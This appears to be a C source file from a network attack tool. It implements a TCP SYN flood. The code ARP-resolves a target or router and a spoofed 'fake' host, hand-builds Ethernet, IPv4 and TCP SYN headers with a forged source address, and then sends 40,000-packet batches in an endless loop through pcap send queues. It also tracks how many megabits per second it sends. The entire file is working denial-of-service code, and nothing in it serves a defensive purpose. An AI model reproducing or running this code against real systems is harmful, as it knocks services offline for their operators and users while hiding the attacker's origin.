#include "SynFlood.h"
#include "Mode.h"
#include "ArpScan.h"
#include "Topology.h"
#include "GeneralSettings.h"
#include "PacketBuilder.h"
#include "NetHeaders.h"
#include "ip4.h"
#include "Checksum.h"

extern local_host_t local_host;
extern settings_t settings;
extern pcap_t * fp;

uint32_t mbits_per_second=0;

void PrepareSynFlood()
{
	item_t * item;

	if(settings.tcp_syn_flood.ip_router!=0)
	{
		ArpScanIp(settings.tcp_syn_flood.ip_router);
		ArpScanIp(settings.tcp_syn_flood.ip_fake);

		item=FindItem(settings.tcp_syn_flood.ip_router);

		if(!item)
		{
			printf("\nCan't resolve ip!\n\n");
			exit(0);
		}

		memcpy(settings.tcp_syn_flood.mac_router, item->mac, 6);

		item=FindItem(settings.tcp_syn_flood.ip_fake);

		if(!item)
		{
			printf("\nCan't resolve ip!\n\n");
			exit(0);
		}

		memcpy(settings.tcp_syn_flood.mac_fake, item->mac, 6);

		printf("\nResolving has been done...\n\n");
	}
	else
	{
		ArpScanIp(settings.tcp_syn_flood.ip_target);
		ArpScanIp(settings.tcp_syn_flood.ip_fake);

		item=FindItem(settings.tcp_syn_flood.ip_target);

		if(!item)
		{
			printf("\nCan't resolve ip!\n\n");
			exit(0);
		}

		memcpy(settings.tcp_syn_flood.mac_target, item->mac, 6);

		item=FindItem(settings.tcp_syn_flood.ip_fake);

		if(!item)
		{
			printf("\nCan't resolve ip!\n\n");
			exit(0);
		}

		memcpy(settings.tcp_syn_flood.mac_fake, item->mac, 6);

		printf("\nResolving has been done...\n\n");
	}
}

void Fill_Ip4(ip4_header_t * p_ip4)
{
	p_ip4->ip_dst.S_un.S_addr=settings.tcp_syn_flood.ip_target;
	p_ip4->ip_hl=5;
	p_ip4->ip_id=0;
	p_ip4->ip_len=htons(sizeof(ip4_header_t)+sizeof(tcp_header_t));
	p_ip4->ip_off=0;
	p_ip4->ip_p=IP4_P_TCP;
	p_ip4->ip_src.S_un.S_addr=settings.tcp_syn_flood.ip_fake;
	p_ip4->ip_sum=0;
	p_ip4->ip_tos=0;
	p_ip4->ip_ttl=128;
	p_ip4->ip_v=4;

	p_ip4->ip_sum=net_checksum(p_ip4, sizeof(ip4_header_t));
}

void Fill_Tcp(tcp_header_t * p_tcp)
{
	p_tcp->source=rand()&0xffff;
	p_tcp->dest=htons(settings.tcp_syn_flood.port);
	p_tcp->ack_seq=0;
	p_tcp->seq=rand()*256*256+rand();
	p_tcp->fin=0;
	p_tcp->ack=0;
	p_tcp->syn=1;
	p_tcp->psh=0;
	p_tcp->res1=0;
	p_tcp->res2=0;
	p_tcp->urg_ptr=0;
	p_tcp->urg=0;
	p_tcp->window=htons(8192);
	p_tcp->check=0;
	p_tcp->doff=5;
	p_tcp->rst=0;
	
	p_tcp->check=net_checksum(p_tcp, sizeof(tcp_header_t));
}

void Fill_Ethernet(ethhdr_t * p_eth)
{
	if(settings.tcp_syn_flood.ip_router!=0)
	{
		memcpy(p_eth->h_source, settings.tcp_syn_flood.mac_fake, 6);
		memcpy(p_eth->h_dest, settings.tcp_syn_flood.mac_router, 6);
	}
	else
	{
		memcpy(p_eth->h_source, settings.tcp_syn_flood.mac_fake, 6);
		memcpy(p_eth->h_dest, settings.tcp_syn_flood.mac_target, 6);
	}
	p_eth->h_proto=htons(ETH_P_IP);
}

void SynFlood(void *p)
{
	packet_t packet;

	int i;
	int r;

	ethhdr_t eth;
	ip4_header_t ip4;
	tcp_header_t tcp;

	ip4_header_t * p_ip4;
	tcp_header_t * p_tcp;

	struct pcap_pkthdr pkt;
	int count;
	int size;
	int packet_size;
	pcap_send_queue * queue;

	count=40000;
	size=sizeof(tcp_header_t)+sizeof(ip4_header_t)+sizeof(ethhdr_t)+sizeof(struct pcap_pkthdr);
	packet_size=sizeof(tcp_header_t)+sizeof(ip4_header_t)+sizeof(ethhdr_t);

	pkt.caplen=pkt.len=packet_size;
	CreatePacket(&packet);
	Fill_Ethernet(&eth);
	AddData(&packet, &eth, sizeof(ethhdr_t));
	Fill_Ip4(&ip4);
	AddData(&packet, &ip4, sizeof(ip4_header_t));
	Fill_Tcp(&tcp);
	AddData(&packet, &tcp, sizeof(tcp_header_t));

	p_ip4=(ip4_header_t *)(packet.data+sizeof(ethhdr_t));
	p_tcp=(tcp_header_t *)(packet.data+sizeof(ethhdr_t)+sizeof(ip4_header_t));	

	while(1)
	{
		queue=pcap_sendqueue_alloc(count*size);
		for(i=0; i<count; i++)
		{
			p_ip4->ip_id=rand()&0xffff;
			p_ip4->ip_sum=0;
			p_ip4->ip_sum=net_checksum((uint8_t *) p_ip4, sizeof(ip4_header_t));
			p_tcp->source=htons(1750+rand()%100);
			p_tcp->ack_seq=0;
			p_tcp->seq=rand()*256*256+rand();
			p_tcp->check=0;
			p_tcp->check=tcp_checksum((uint8_t *) p_tcp, sizeof(tcp_header_t), settings.tcp_syn_flood.ip_target, settings.tcp_syn_flood.ip_fake);
			r=pcap_sendqueue_queue(queue,&pkt,packet.data);
			if(r==-1) 
			{
				break;
			}
		}	
		mbits_per_second+=pcap_sendqueue_transmit(fp, queue, 0)*8/(1024*1024);
		pcap_sendqueue_destroy(queue);
	}
	
	DestroyPacket(&packet);
}
